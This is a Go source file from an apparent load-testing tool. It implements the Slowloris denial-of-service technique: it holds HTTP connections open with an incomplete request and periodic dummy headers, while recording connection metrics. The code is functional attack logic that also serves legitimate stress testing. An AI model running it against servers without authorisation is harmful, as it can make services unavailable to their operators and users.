package strategy

import (
	"context"
	"time"

	"github.com/srtdog64/loadtestforge/internal/config"
	"github.com/srtdog64/loadtestforge/internal/httpdata"
	"github.com/srtdog64/loadtestforge/internal/netutil"
)

// SlowlorisClassic implements the classic Slowloris attack.
// It sends incomplete HTTP requests (without final CRLF) and periodically
// sends dummy headers to keep the connection alive.
type SlowlorisClassic struct {
	BaseStrategy
}

// NewSlowlorisClassic creates a new SlowlorisClassic strategy.
func NewSlowlorisClassic(keepAliveInterval time.Duration, bindIP string) *SlowlorisClassic {
	common := DefaultCommonConfig()
	common.KeepAliveInterval = keepAliveInterval
	return &SlowlorisClassic{
		BaseStrategy: NewBaseStrategy(bindIP, common),
	}
}

// NewSlowlorisClassicWithConfig creates a SlowlorisClassic strategy from StrategyConfig.
func NewSlowlorisClassicWithConfig(cfg *config.StrategyConfig, bindIP string) *SlowlorisClassic {
	return &SlowlorisClassic{
		BaseStrategy: NewBaseStrategyFromConfig(cfg, bindIP),
	}
}

func (s *SlowlorisClassic) Execute(ctx context.Context, target Target) error {
	connID := generateConnID()
	startTime := time.Now()

	mc, parsedURL, err := netutil.DialManaged(ctx, target.URL, s.GetConnConfig(), &s.activeConnections)
	if err != nil {
		return err
	}
	defer mc.Close()

	// Record connection start
	s.RecordConnectionStart(connID, mc.RemoteAddr().String())

	userAgent := httpdata.RandomUserAgent()

	// Send incomplete HTTP request (no final \r\n to terminate headers)
	incompleteRequest := s.GetHeaderRandomizer().BuildIncompleteRequest(parsedURL, userAgent)

	if _, err := mc.WriteWithTimeout([]byte(incompleteRequest), config.DefaultWriteTimeout); err != nil {
		s.RecordTimeout()
		return err
	}

	// Record initial success
	s.RecordLatency(time.Since(startTime))

	ticker := time.NewTicker(s.GetKeepAliveInterval())
	defer ticker.Stop()

	for {
		select {
		case <-mc.Context().Done():
			s.RecordConnectionEnd(connID)
			return nil
		case <-ticker.C:
			dummyHeader := httpdata.GenerateDummyHeader()
			if _, err := mc.WriteWithTimeout([]byte(dummyHeader), config.DefaultWriteTimeout); err != nil {
				s.RecordTimeout()
				s.RecordConnectionEnd(connID)
				return err
			}
			// Record activity
			s.RecordConnectionActivity(connID)
		}
	}
}

func (s *SlowlorisClassic) Name() string {
	return "slowloris-classic"
}
